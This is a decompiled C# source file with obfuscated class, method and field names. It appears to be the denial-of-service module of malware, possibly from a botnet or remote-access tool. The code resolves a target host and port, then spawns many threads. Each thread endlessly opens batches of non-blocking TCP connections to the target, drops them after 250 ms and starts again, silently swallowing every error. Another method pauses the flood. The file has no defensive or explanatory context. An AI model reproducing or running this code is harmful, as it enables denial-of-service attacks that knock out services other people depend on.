using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

public class LttggIQdFZEctGurlEBXHSY
{
	private class GmGMUJoxywCZfnRedtxzrRg
	{
		private IPEndPoint fqwsEVWrsDaHkBgnHOEjefd;

		private Socket[] iUNUyZLaehYxaGplaukbpzi;

		private int iVIjFSgOfRVujgaspNiHNJU;

		public GmGMUJoxywCZfnRedtxzrRg(IPEndPoint YmIKTdXBRjEXRHmvvuykdkP, int bbquxpOdWGnqLnrGQlylYzW)
		{
			fqwsEVWrsDaHkBgnHOEjefd = YmIKTdXBRjEXRHmvvuykdkP;
			iVIjFSgOfRVujgaspNiHNJU = bbquxpOdWGnqLnrGQlylYzW;
		}

		public void UwevhlLlwqJGdyXPMXoDYMV(IAsyncResult ar)
		{
		}

		public void Send()
		{
			checked
			{
				while (true)
				{
					try
					{
						iUNUyZLaehYxaGplaukbpzi = new Socket[iVIjFSgOfRVujgaspNiHNJU - 1 + 1];
						int num = iVIjFSgOfRVujgaspNiHNJU - 1;
						for (int i = 0; i <= num; i++)
						{
							iUNUyZLaehYxaGplaukbpzi[i] = new Socket(fqwsEVWrsDaHkBgnHOEjefd.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
							iUNUyZLaehYxaGplaukbpzi[i].Blocking = false;
							AsyncCallback callback = UwevhlLlwqJGdyXPMXoDYMV;
							iUNUyZLaehYxaGplaukbpzi[i].BeginConnect(fqwsEVWrsDaHkBgnHOEjefd, callback, iUNUyZLaehYxaGplaukbpzi[i]);
						}
						Thread.Sleep(250);
						int num2 = iVIjFSgOfRVujgaspNiHNJU - 1;
						for (int i = 0; i <= num2; i++)
						{
							if (iUNUyZLaehYxaGplaukbpzi[i].Connected)
							{
								iUNUyZLaehYxaGplaukbpzi[i].Disconnect(reuseSocket: false);
							}
							iUNUyZLaehYxaGplaukbpzi[i].Close();
							iUNUyZLaehYxaGplaukbpzi[i] = null;
						}
						iUNUyZLaehYxaGplaukbpzi = null;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						int num3 = iVIjFSgOfRVujgaspNiHNJU - 1;
						for (int i = 0; i <= num3; i++)
						{
							try
							{
								if (iUNUyZLaehYxaGplaukbpzi[i].Connected)
								{
									iUNUyZLaehYxaGplaukbpzi[i].Disconnect(reuseSocket: false);
								}
								iUNUyZLaehYxaGplaukbpzi[i].Close();
								iUNUyZLaehYxaGplaukbpzi[i] = null;
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								ProjectData.ClearProjectError();
							}
						}
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	private static ThreadStart[] UfwxTVeCiMcJPiqfLHHFKvo;

	private static Thread[] vaBmCGJBZDhRNCWMDRbKKwj;

	public static string VrESzRDHhVTNfcyUtyuHKZu;

	private static IPEndPoint vFPKnDWpJEsYhiglWPWBONd;

	public static int hjbBQIsacwZerDXkYKlIHiQ;

	private static GmGMUJoxywCZfnRedtxzrRg[] hTXxYjdvsPlKCxKapLyIfaE;

	public static int YJqsNpuJFnBabCLXzTxWoOo;

	public static int ztMuSCMSOaqGNPYvqUWDJck;

	public static void ZFBBzFpwEUutKzDuTwbZHvQ()
	{
		try
		{
			vFPKnDWpJEsYhiglWPWBONd = new IPEndPoint(Dns.GetHostEntry(VrESzRDHhVTNfcyUtyuHKZu).AddressList[0], hjbBQIsacwZerDXkYKlIHiQ);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			vFPKnDWpJEsYhiglWPWBONd = new IPEndPoint(IPAddress.Parse(VrESzRDHhVTNfcyUtyuHKZu), hjbBQIsacwZerDXkYKlIHiQ);
			ProjectData.ClearProjectError();
		}
		checked
		{
			vaBmCGJBZDhRNCWMDRbKKwj = new Thread[ztMuSCMSOaqGNPYvqUWDJck - 1 + 1];
			UfwxTVeCiMcJPiqfLHHFKvo = new ThreadStart[ztMuSCMSOaqGNPYvqUWDJck - 1 + 1];
			hTXxYjdvsPlKCxKapLyIfaE = new GmGMUJoxywCZfnRedtxzrRg[ztMuSCMSOaqGNPYvqUWDJck - 1 + 1];
			int num = ztMuSCMSOaqGNPYvqUWDJck - 1;
			for (int i = 0; i <= num; i++)
			{
				hTXxYjdvsPlKCxKapLyIfaE[i] = new GmGMUJoxywCZfnRedtxzrRg(vFPKnDWpJEsYhiglWPWBONd, YJqsNpuJFnBabCLXzTxWoOo);
				UfwxTVeCiMcJPiqfLHHFKvo[i] = hTXxYjdvsPlKCxKapLyIfaE[i].Send;
				vaBmCGJBZDhRNCWMDRbKKwj[i] = new Thread(UfwxTVeCiMcJPiqfLHHFKvo[i]);
				vaBmCGJBZDhRNCWMDRbKKwj[i].Start();
			}
		}
	}

	public static void ULZjSSFFgoCdwcBSeSQKcZv()
	{
		checked
		{
			int num = ztMuSCMSOaqGNPYvqUWDJck - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					vaBmCGJBZDhRNCWMDRbKKwj[i].Suspend();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					vaBmCGJBZDhRNCWMDRbKKwj[i].Suspend();
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
